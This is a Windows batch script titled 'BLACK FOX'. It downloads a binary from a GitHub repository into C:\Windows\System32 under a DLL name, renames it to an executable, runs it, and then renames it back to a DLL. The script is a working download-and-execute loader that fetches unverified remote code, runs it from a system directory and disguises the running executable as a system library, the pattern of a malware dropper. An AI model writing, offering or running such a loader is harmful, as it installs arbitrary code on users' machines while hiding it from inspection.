@echo off
echo BLACK FOX

:: Step 1: Delete old file if it exists
if exist "C:\Windows\System32\SNIPER110.dll" del /f /q "C:\Windows\System32\SNIPER110.dll"
if exist "C:\Windows\System32\BLACK FOX.exe" del /f /q "C:\Windows\System32\BLACK FOX.exe"

:: Step 2: Download the new file
powershell -Command "Invoke-WebRequest -Uri 'https://github.com/BLACK89310/kanel/raw/refs/heads/main/BLACK%20FOX%20BD110' -OutFile 'C:\Windows\System32\SNIPER110.dll'"

:: Step 3: Rename the downloaded DLL to EXE
ren "C:\Windows\System32\SNIPER110.dll" "BLACK FOX.exe"

:: Step 4: Run the EXE
start "" "C:\Windows\System32\BLACK FOX.exe"

:: Step 5: Wait for 5 seconds
timeout /t 5 /nobreak

:: Step 6: Rename the EXE back to DLL
ren "C:\Windows\System32\BLACK FOX.exe" "SNIPER110.dll"

pause